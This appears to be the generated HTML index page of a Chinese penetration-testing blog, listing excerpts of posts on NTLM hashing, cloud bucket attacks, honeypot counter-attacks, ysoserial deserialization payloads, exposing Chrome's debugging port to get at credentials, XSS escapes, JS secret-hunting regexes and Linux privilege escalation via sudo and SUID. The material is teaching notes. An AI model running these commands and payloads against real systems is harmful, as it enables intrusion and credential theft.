@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="dark">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Nodes | h4xk0r blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="Nodes - h4xk0r blog">
+<meta name="author" content="h4xk0r">
+<link rel="canonical" href="http://localhost:1313/nodes/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.314abab0bce79c9458c3bcc909ca5440767e8fa2822428ed33ce608ca6f66fa0.css" integrity="sha256-MUq6sLznnJRYw7zJCcpUQHZ&#43;j6KCJCjtM85gjKb2b6A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/nodes/index.xml" title="rss">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/nodes/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script>
+</head>
+<body class="list" id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="h4xk0r blog (Alt + H)">h4xk0r blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/posts/" title="档案">
+                    <span>档案</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索 (Alt &#43; /)" accesskey=/>
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/fuzzlist/" title="Fuzzlist">
+                    <span>Fuzzlist</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main"> 
+<header class="page-header">
+  <h1>
+    Nodes
+  </h1>
+</header>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">LM,NTMLv1&amp;v2
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>LM, NTLMv1, NTLMv2是windows的各个版本的网络认证协议,用于在不传递密钥使得服务器验证用户身份
+LM LM:
+LM是早期windows的网络认证协议,是Windows 3.x / 95 / 98 / Me时期的认证协议.在Vista版本前都默认开启
+LM Hash生成流程:
+转大写 这里以h4xk0r为例
+h4xk0r ---&gt; H4XK0R 转换成16进制 截断/填充到14字节
+&gt;&gt;&gt; password = &#34;H4XK0R&#34; &gt;&gt;&gt; print(password.encode().hex()) 48 34 58 4b 30 52 结果不满足14字节,00补足 48 34 58 4b 30 52 00 00 00 00 00 00 00 00 拆分成两个7字节
+组1: 48 34 58 4b 30 52 00 组2: 00 00 00 00 00 00 00 转换成DES密钥
+将两组16进制转换成2进制 key1: 1001000001101000101100001001011001100000101001000000000 每七位一组 组 1：0100100 组 2：0001101 组 3：0001011 组 4：0000100 组 5：1011001 组 6：1000001 组 7：0100100 组 8：0000000	//不足7位补0 要在每一组的最后补上 1 位，让每一组里 1 的总个数为奇数（即奇校验） 01001001 00011010 00010110 00001000 10110011 10000011 01001001 00000001 合并0100100100011010000101100000100010110011100000110100100100000001 --&gt; 转回16进制49 1A 16 08 B3 83 49 01 key2: 00000000000000000000000000000000000000000000000000000000 因为是全零,分组就要补1如, 00000001 最后转换成16进制后就是 --&gt; 01 01 01 01 01 01 01 01 字符串(KGS!@#$%)加密
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-06-13 10:46:13 +0800 CST'>June 13, 2026</span>&nbsp;·&nbsp;<span>3 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to LM,NTMLv1&v2" href="http://localhost:1313/nodes/lmntmlv1v2/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Bucket Attack and Defense
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>对象存储 存储桶是对象存储服务中的一个概念,简单来说就像一个网盘用来存储文件,图片等资源.不同的厂商名字不同但本质是一个东西
+AWS (亚马逊云): Amazon S3 (Simple Storage Service) 阿里云: OSS (Object Storage Service) 腾讯云: COS (Cloud Object Storage) 华为云: OBS (Object Storage Service) 存储桶的优点 弹性容量: 根据所使用的实际大小收费 支持高并发高可用 自带网络属性: 每一个存储进存储桶的文件只要配置为公开.就会生成一个公网的url 存储桶的结构 graph TD %% 样式 classDef b fill:#f9cb9c,stroke:#b45f06,stroke-width:2px; classDef o fill:#7f8c8d,stroke:#34495e,stroke-width:1px,color:#fff; classDef det fill:#fff,stroke:#333,stroke-width:1px; %% 拓扑结构 Cloud[云对象存储] --&gt; Bucket1(其他存储桶...) Cloud --&gt; TargetBucket(目标存储桶 bucket) TargetBucket --&gt; Obj1(Object 1) TargetBucket --&gt; TargetObj(Object 2) TargetBucket --&gt; Obj3(Object 3) TargetObj --&gt; Key[Key 文件名 / 路径] TargetObj --&gt; Data[Data 文件真实内容] TargetObj --&gt; Meta[Metadata 大小 / 类型 / 权限等元数据] class TargetObj,Obj1,Obj3 o;对象存储中可以有多个桶,然后把对象 (Object) 放在桶中,对象又包含key,Data和Metadata
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-05-18 19:50:15 +0800 CST'>May 18, 2026</span>&nbsp;·&nbsp;<span>2 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Bucket Attack and Defense" href="http://localhost:1313/nodes/bucket-attack-and-defense/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">蜜罐及反制技术
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>蜜罐是一种主动防御技术,它通过故意暴露的漏洞或者敏感信息,诱导黑客进行攻击,增加攻击者的攻击成本并对攻击者的攻击方式进行分析,溯源等以便更好的防御的一种手段.
+蜜罐的分类 蜜罐从低到高分为低交互蜜罐,中交互蜜罐,高交互蜜罐以及蜜罐集群组成的蜜网
+低交互蜜罐: 只提供特定服务,通过脚本或者程序模拟协议的行为实现. 虽然不够仿真,但是成本低,也具备捕获攻击者IP,载荷等信息的能力
+中交互蜜罐: 中交互蜜罐可以模拟一个相对完整的应用环境,但是不具备真实的操作系统内核,是进程级的服务模拟.可以提供更完整的攻击交互,如文件上传,注入等模拟执行成功后的结果
+高交互蜜罐: 高交互蜜罐是基于真实的操作系统和服务构建的.通常在虚拟机或者沙箱中.攻击者拿到的是shell权限.但是如果防护不到位攻击者可能会以此为跳板攻击真实的内网机器.成本极高.用于捕获APT攻击等
+蜜网 蜜网实际上是有多个蜜罐组成的集群.构成: Honeywall(蜜罐网关): 负责控制流量,防止攻击者逃逸和捕获数据
+蜜罐集群: 包含多种蜜罐
+Honeytoken: 散布在网络中的诱饵信息,如数据库账号密码等.用于引诱攻击者下一步进攻
+蜜罐反制 web蜜罐反制 jsonp劫持: 蜜罐前端会内置大量的主流网站(Google,GitHub等)的jsonp接口,只要当前的浏览器登陆过这些网站,蜜罐通过跨域请求就能够直接拿到你的账号信息,或者浏览器,屏幕等硬件信息.
+通过留下诱饵信息,如数据库的连接账户密码等,让攻击者进行连接,从而进行数据库蜜罐反制,或者进入蜜网等
+通过网站的合理交互功能,如填写手机号或者个人信息,获取攻击者的信息
+MySQL数据库蜜罐反制 成因: LOAD DATA LOCAL INFILE机制: 可以将本地文件发送到数据库中
+正常使用: 客户端输入 LOAD DATA LOCAL INFILE &#39;/etc/passwd&#39; INTO TABLE users;，客户端驱动就会读取本地的 /etc/passwd 并发给服务器
+蜜罐使用: 当你通过投下的诱饵连接数据库时,蜜罐服务器会在握手成功后或者执行命令的时候主动向客户端发送文件请求的数据包,将攻击者的文件拿到手,一些常见的抓取文件:
+Windows 路径： C:/Users/Administrator/AppData/Roaming/Tencent/WeChat/All Users/config/config.data（获取微信基本信息） C:/Users/Default/AppData/Local/Google/Chrome/User Data/Default/Login Data（Chrome 凭据） Linux 路径： ~/.ssh/id_rsa（SSH 私钥） ~/.bash_history（历史命令，可能包含敏感密码或其它跳板 IP） 攻击方反制手段 存储型XSS:
+蜜罐可以将攻击者的个人信息或者攻击载荷等展示出来如:Username ,User-Agent等,可以在攻击的时候在这些地方插入payload,对防守方进行反制
+攻击者下载文件植入木马后传回去,当防守方直接打开后就会中招
+在防守方下载文件之前,替换重要文件如微信的config.data文件,替换成钓鱼凭证,当防守方查看时就会触发
+蜜罐N-day
+防守方的管理系统存在N-day或者使用的插件等存在N-day等
+蜜罐特征(转) 3.1 协议的返回特征
+部分开源蜜罐在模拟各个协议时，会在响应中带有一些明显的特征，可以根据这些特征来检测蜜罐。
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-05-14 19:38:41 +0800 CST'>May 14, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to 蜜罐及反制技术" href="http://localhost:1313/nodes/honeypot-anti-takeover/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Yso
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>JAVA_YSO 基础命令格式 java -jar ysoserial.jar [利用链] [执行的命令] 利用链: CommonsCollections1, URLDNS, Jackson 等 探测/检测 如果不确定对方是否存在反序列化漏洞,或者不清楚使用了哪些依赖库可以使用URLDNS
+java -jar ysoserial.jar URLDNS &#34;http://your-dnslog-url.com&#34; 注: 如果执行复杂命令最好封装成脚本执行,或者使用sh -c/bash -c
+.net_yso 基础命令
+ysoserial.exe -g [Gadget] -f [Formatter] -c &#34;[Command]&#34; -o 编码 -g 利用链的名称,如TextFormattingRunProperties -f 序列化类型,如 BinaryFormatter, Json.Net, ObjectStateFormatter -c 执行的命令 -o 编码处理,如 raw ,bash64, urlencode 利用 (web Machinekey泄露)
+ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &#34;cmd /c echo pwned &gt; C:\windows\temp\test.txt&#34; --validationkey=&#34;你的KEY&#34; --validationalg=&#34;SHA1&#34; 技巧
+- p 参数可以指定插件,对一些特定目标进行测试
+-p ViewState：处理 ASP.NET ViewState。 -p ActivitySurrogateSelector：，可以绕过较新的 .NET 补丁，实现无文件落地执行任意 C# 代码。 利用链:
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-04-10 23:50:39 +0800 CST'>April 10, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Yso" href="http://localhost:1313/nodes/yso/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Chrome DevTools Protocol
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>什么是CDP(Chrome DevTools Protocol)? cdp是一个基于JSON-RPC格式,通过websocket进行通信的协议.可以通过它对浏览器进行操作
+他能做什么? cdp是浏览器的底层,简单来说可以控制浏览器做任何事情
+如何启动CDP: 以下以chrome浏览器做演示,但是实际上只要使用了Chromium内核的浏览器都原生支持CDP如 chrome,edgeGecko(firefox) 部分支持,而WebKit(Safari)对CDP却不支持
+注: 因浏览器默认都是单实例模式,指令会传递给已有进程但并不执行.所以开启远程端口前需要先关闭原有进程,命令:
+taskkill /F /IM chrome.exe 开启远程调试端口 关闭chrome后我们执行
+chrome.exe --remote-debugging-port=9226 --remote-debugging-address=0.0.0.0 --remote-allow-origins=* --user-data-dir=&#34;C:\Users\Public\ChromeDebug&#34; --headless=new 参数讲解: --remote-debugging-port	指定开启的远程调试端口 --remote-debugging-address	允许指定IP访问调试,新版禁用了0.0.0.0,可以使用端口转发.(最后提供一个frpc解决方式,见文章末尾) --remote-allow-origins	允许任何来源连接调试端口 --headless=new	无头模式(109引入) --user-data-dir: 默认目录为%LOCALAPPDATA%\Google\Chrome\User Data 当指定一个目录的时候浏览器会打开一个新的浏览器页面相当与两个用户数据互不干扰.
+这里在测试时发现本地复制user Data目录启动浏览器依然不可以获取凭证,按理来说不同机器复制才会出现这种情况,希望有大佬解惑.复制命令如下
+powershell: powershell -command &#34;$exclude = @(&#39;Cache&#39;,&#39;Code Cache&#39;,&#39;GPUCache&#39;,&#39;Media Cache&#39;,&#39;Service Worker&#39;); Get-ChildItem -Path $env:LOCALAPPDATA&#39;\Google\Chrome\User Data&#39; -Recurse | Where-Object { $exclude -notcontains $_.Name } | Copy-Item -Destination { Join-Path $env:LOCALAPPDATA&#39;\ChromeDebug&#39; $_.FullName.Substring($env:LOCALAPPDATA.Length &#43; 25) } -Force -ErrorAction SilentlyContinue&#34; cmd: xcopy &#34;%LOCALAPPDATA%\Google\Chrome\User Data&#34; &#34;%LOCALAPPDATA%\ChromeDebug&#34; /E /I /H /C /Y /EXCLUDE:no_copy.txt /EXCLUDE:no_copy.txt 指定排除文件 开启远程端口后检查是否成功
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-03-30 21:28:24 +0800 CST'>March 30, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Chrome DevTools Protocol" href="http://localhost:1313/nodes/cdp/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">K8s&amp;Docker
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Docker docker是一种轻量级容器技术,可将应用及其依赖打包成标准化单元
+Docker的优势 启动快速 跨平台 高效运维 环境一致性 (避免只有我的机器能跑) K8s的作用和架构 为什么需要k8s? 假设现在又10个容器让你管理,管理的过来,那随着业务发展增加到1000台呢,这些容器又部署在不同的服务器上,每一个环境都不相同.那有什么办法解决这个问题? 于是k8s应运而生
+k8s的优势 资源自动调度
+k8s会根据容器所需的资源扫描服务器集群,把空闲的机器部署容器,实现资源最大化 负载均衡
+k8s提供一个统一的入口,不管后端容器的IP变化,都会转发到对应的容器中 自动修复
+k8s会不断检查运行状态,如果容器挂了会自动拉起一个新的,如果机器坏了,会自动迁移到其他机器上 K8s核心组件 graph TD%% 定义 Master 节点结构subgraph MasterGroup[Master节点]direction TBMaster[Master节点] --&gt; API[API Server]Master --&gt; CM[Controller Manager]Master --&gt; Sched[Scheduler]end%% 定义 Node 节点结构subgraph NodeGroup[Node节点]direction TBNode[Node节点] --&gt; KL[Kubelet]Node --&gt; KP[Kube-Proxy]Node --&gt; P[Pod]endPod
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-03-30 21:28:24 +0800 CST'>March 30, 2026</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to K8s&Docker" href="http://localhost:1313/nodes/k8s/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">XSS
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>逃逸手法分类/选择: **HTML标签内部:**如在&lt;div&gt; xxx &lt;/div&gt;中
+逃逸: 直接闭合标签&lt;/div&gt; &lt;script&gt;alert(1)&lt;/script&gt;
+HTML属性内部:&lt;input type=&#34;text&#34; value=&#34;xxxx&#34;&gt;
+逃逸:
+一. 闭合属性,添加事件或者闭合标签 &#34; onmouseover=&#34;alert(1)或者
+&#34;&gt; &lt;script&gt;alert(1)&lt;/script&gt;
+Javascript变量内: &lt;script&gt; var name = &#39;xxxx&#39;; &lt;/script&gt;
+逃逸: 闭合单引号或者标签,闭合或者注释掉后面的代码, &#39;; alert(1); // DOM渲染: 数据不回传服务器，直接被前端 JS（如 .innerHTML、eval()）接收并渲染。
+挖掘思路 输入框测试: 先看源代码,输入的数据在什么里面,再测试能不能截断或者添加事件等方法,输入绕过的字符如: &#39; &#34; &lt; &gt; / ; \等,观察源代码哪一个被过滤了
+变成&amp;lt; 说明做了实体编码 没有变化,说明有xss的可能 其他测试点:
+json报错页面: 很多 API 报错时会原样回显你输入的非法 JSON 字段
+配合文件上传
+https://www.freebuf.com/vuls/418170.html 可以看这篇文章
+HTTP头(盲XSS) 在 Referer、User-Agent、X-Forwarded-For 中注入盲打 Payload，盲打后台
+绕过: 使用不太常见的标签或者事件:
+这里推荐一个网站 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+编码绕过:
+浏览器解析 HTML 时有特定的解码顺序（HTML 解码 -&gt; URL 解码 -&gt; JS 解码）
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-03-19 00:33:54 +0800 CST'>March 19, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to XSS" href="http://localhost:1313/nodes/xss/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">JS
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>本人代码能力不是很好，对很多网站框架和文件理解不是很深，所以看js文件的时候难免有些困难，所以有了这篇文章
+JS审计技巧 遇到source.map(.map)可以直接还原源码
+首先是一些用来搜索的正则：
+api/| /v[0-9]|/admin|/internal|/private key:|secret:|token:|password:|apikey|sk_ |pk_ |AKIA（AWS） fetch|axios|XMLHttpRequest|$.post|$.ajax localStorage|sessionStorage|cookie if\s*\(\s*user\.role|isAdmin|level|permission innerHTML|eval|document\.write（XSS sink） 看完上面这些，还要看什么？ 密钥
+如: const KEY = &#34;xxx&#34;、process.env.VITE_xxx（Vite 常见泄露）、client_secret。
+如config.chunk.js 里：
+const stripeConfig = { publishableKey: &#34;pk_live_51Hb...xxxx&#34;, // Stripe 真实密钥 clientSecret: &#34;sk_test_51Hb...xxxx&#34; }; var fallbackSecret = &#34;supersecret2025!@#&#34;; // 备用密钥 API 可以用上面的正则去搜
+逻辑/授权检查 如: if (user.isAdmin)、if (role === &#39;vip&#39;)、if (canEdit)。
+if (user.vipLevel &gt;= 3) { showDownloadButton(); // 前端判断 } else { hideIt(); } 加密/签名 如CryptoJS、encrypt、sign、md5、rsa 函数。
+password: CryptoJS.AES.encrypt(pwd, &#39;hardcoded_key_123&#39;).toString() 逆向出密钥，就能批量撞库或伪造登录
+不用看的JS 第三方库完整代码jquery-3.6.0.min.js、lodash.min.js、react.production.min.js 全文件。 → 只看最上面注释的版本号（查 CVE），其余不看。
+一些框架的打包，如React/Vue/Next.js 的
+_createElementVNode, useState, render() { ... } 还有一些轮番图片等
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-28 22:41:23 +0800 CST'>February 28, 2026</span>&nbsp;·&nbsp;<span>1 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to JS" href="http://localhost:1313/nodes/js%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Java基础
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>JAVA 反射 什么是java的反射 java反射就是在程序运行状态中，能够知道任何一个类的所有属性和方法，并且能够调用这些属性和方法的功能
+正向 VS 反向 正向流程： 导入类 –&gt; new对象 –&gt; 调用对象
+User user = new User(); user.login(); 如果类不存在就报错
+**反向流程：**拿到字符串类名 –&gt; 让JVM去找这个类 –&gt; 强行拆解这个类 –&gt; 调用里面的东西
+Class.forName(&#34;com.User&#34;).getMethod(&#34;login&#34;).invoke(obj); 动态加载类，即使编译时类还没有也能运行
+类加载机制 什么是类加载 java代码进行编译后就是.class文件（字节码），类加载就是把这些二进制数据读进内存，解析并生成一个java.lang.Class对象的过程
+类加载的三个阶段 Loading（加载） 读取字节流，不执行代码 Linking（链接） 分为验证，准备，解析。 一般不执行代码 lnitialization(初始化) 执行静态代码块，静态变量的赋值动作 两种攻击方式： 例子： class Evil { // 1. 静态变量赋值 public static int a = runCommand(); // 2. 静态代码块 static { System.out.println(&#34;静态代码块被执行了&#34;); } public static int runCommand() { System.out.println(&#34;静态变量赋值触发了恶意方法！&#34;); return 1; } } 会会先执行赋值，然后是静态代码块。因为初始化执行的顺序是 “静态变量赋值” 和 “静态代码块”
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-16 00:00:00 +0000 UTC'>February 16, 2026</span>&nbsp;·&nbsp;<span>5 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Java基础" href="http://localhost:1313/nodes/java%E5%9F%BA%E7%A1%80/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Linux提权
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>常规提权方式 一、sudo滥用提权 sudo -l提示要输入密码的原因:
+默认SUDO行为 : 需要输入当前用户的密码(不是root)密码
+sudoers配置问题: 未配置免密码访问 在/etc/sudoers文件中没有为当前用户配置NOPASSWD选项
+配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组
+检查当前用户所在组 id username 如果发现在wheel组中,检查wheel组的配置
+查看%wheel相关配置,看是否设置了NOPASSWD或要求密码
+sudo visudo 从wheel组中移除用户
+sudo gpasswd -d username wheel 利用步骤： 查看当前用户sudo权限：
+sudo -l 示例输出：(ALL) NOPASSWD: /usr/bin/vim 利用vim提权：
+sudo /usr/bin/vim 在vim中输入 :set shell=/bin/bash 回车 然后输入 :shell 回车 成功获得root shell 利用其他命令提权：
+如果发现可以执行/usr/bin/nano：
+sudo /usr/bin/nano 在nano中按Ctrl&#43;R，输入!bash，回车 即可获得root shell 说明： sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。
+二、SUID特殊权限提权 利用步骤： 查找SUID文件：
+find / -perm -u=s -type f 2&gt;/dev/null 利用/bin/mount提权：
+mkdir /tmp/mount touch /tmp/mount/malicious_file sudo /bin/mount -o bind /tmp/mount /tmp/mount sudo /bin/mount /tmp/mount /tmp/mount 通过此方式可获取root权限 利用/bin/ping提权：
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-02-15 00:00:00 +0000 UTC'>February 15, 2026</span>&nbsp;·&nbsp;<span>6 min</span>&nbsp;·&nbsp;<span>h4xk0r</span></footer>
+  <a class="entry-link" aria-label="post link to Linux提权" href="http://localhost:1313/nodes/linux%E6%8F%90%E6%9D%83/"></a>
+</article>
+<footer class="page-footer">
+  <nav class="pagination">
+    <a class="next" href="http://localhost:1313/nodes/page/2/">Next&nbsp;&nbsp;»
+    </a>
+  </nav>
+</footer>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/">h4xk0r blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            const id = this.getAttribute("href").substr(1);
+            if (!id) return;
+
+            
+            
+            const nextUl = this.nextElementSibling;
+            if (this.closest('.toc') && nextUl && nextUl.tagName === 'UL') {
+                const rect = this.getBoundingClientRect();
+                const offsetX = e.clientX - rect.left;
+
+                
+                if (offsetX < 45) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    
+                    const isVisible = window.getComputedStyle(nextUl).display !== 'none';
+                    nextUl.style.display = isVisible ? 'none' : 'block';
+                    this.parentElement.classList.toggle('is-expanded');
+                    
+                    return false; 
+                }
+            }
+
+            
+            
+            e.preventDefault();
+            const targetElement = document.querySelector(`[id='${decodeURIComponent(id)}']`);
+            if (targetElement) {
+                if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                    targetElement.scrollIntoView({ behavior: "smooth" });
+                } else {
+                    targetElement.scrollIntoView();
+                }
+                
+                if (id === "top") {
+                    history.replaceState(null, null, " ");
+                } else {
+                    history.pushState(null, null, `#${id}`);
+                }
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script></body>
+
+</html>
